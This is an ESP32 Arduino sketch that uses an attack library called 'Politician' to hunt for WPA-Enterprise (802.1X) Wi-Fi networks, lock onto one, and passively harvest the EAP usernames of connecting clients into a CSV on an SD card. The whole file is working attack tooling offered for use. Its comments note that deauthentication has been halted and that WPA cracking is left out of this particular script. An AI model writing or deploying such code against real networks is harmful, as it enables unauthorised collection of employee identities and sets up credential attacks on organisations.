#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include "Politician.h"
#include "PoliticianStorage.h"

using namespace politician;
using namespace politician::storage;

Politician engine;
bool isLockedOnTarget = false;

void setup() {
    Serial.begin(115200);
    delay(2000); 

    Serial.println("\n[+] Initializing Storage...");
    if (!SD.begin(5)) {
        Serial.println("[-] SD Card Mount Failed! Identities will not be saved to disk.");
    }

    Serial.println("[+] Enabling Politician Auto-Hunter Engine...");

    Config cfg;
    cfg.capture_filter = LOG_FILTER_BEACONS | LOG_FILTER_HANDSHAKES;
    cfg.hop_dwell_ms   = 200; // Fast hop to aggressively scout the environment
    engine.begin(cfg);

    // 1. Hook the AP Discovery callback to evaluate networks asynchronously
    engine.setApFoundCallback([](const ApRecord &rec) {
        if (isLockedOnTarget) return; // We already found a target!

        // Print what we see (Check if hidden network!)
        const char *ssidName = (rec.ssid_len > 0) ? rec.ssid : "<HIDDEN>";

        // Verify if the Authentication Mode is 802.1X Enterprise (auth = 4)
        if (rec.enc == 4) {
            Serial.printf("[!!!] FOUND ENTERPRISE NETWORK: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
                ssidName,
                rec.bssid[0], rec.bssid[1], rec.bssid[2], rec.bssid[3], rec.bssid[4], rec.bssid[5]
            );

            // ==========================================
            // DYNAMIC LOCK-ON MECHANISM
            // ==========================================
            Serial.printf("      -> Locking frequency to Channel %d\n", rec.channel);
            Serial.println("      -> Halting deauthentication. Moving to ATTACK_PASSIVE silent listening.");
            
            engine.setTarget(rec.bssid, rec.channel);
            engine.setAttackMask(ATTACK_PASSIVE);
            
            isLockedOnTarget = true;
        } else {
            // Uninteresting target. Log it and move on.
            // Using extremely short format to avoid spamming serial during high-speed hopping.
            Serial.printf("(-) Ignore: %s\n", ssidName);
        }
    });

    // 2. Hook Identity Extraction
    // This will only begin firing once the ESP32 locks onto an Enterprise AP and a corporate client connects!
    engine.setIdentityCallback([](const EapIdentityRecord &rec) {
        if (EnterpriseCsvLogger::append(SD, "/auto_hunting_identities.csv", rec)) {
            Serial.println("\n=============================================");
            Serial.printf("[BINGO] Harvested Username: %s\n", rec.identity);
            Serial.printf("        AP: %02X:%02X:%02X:%02X:%02X:%02X  Client: %02X:%02X:%02X:%02X:%02X:%02X\n",
                rec.bssid[0], rec.bssid[1], rec.bssid[2], rec.bssid[3], rec.bssid[4], rec.bssid[5],
                rec.client[0], rec.client[1], rec.client[2], rec.client[3], rec.client[4], rec.client[5]
            );
            Serial.println("=============================================\n");
            
            // NOTE: You could optionally call engine.clearTarget() here
            // to release the lock and resume hunting for the next Enterprise AP!
        }
    });

    // To prevent the script from randomly spamming the serial monitor too fast,
    // explicitly tell the framework to completely ignore APs with standard Personal auth.
    // In our case we aren't cracking, so standard WPA networks aren't useful to us.
    engine.setTargetFilter([](const ApRecord &rec) {
        return (rec.enc == 4); // Only allow Enterprise auth to even reach the engine!
    });

    engine.startHopping();
}

void loop() {
    engine.tick();
}
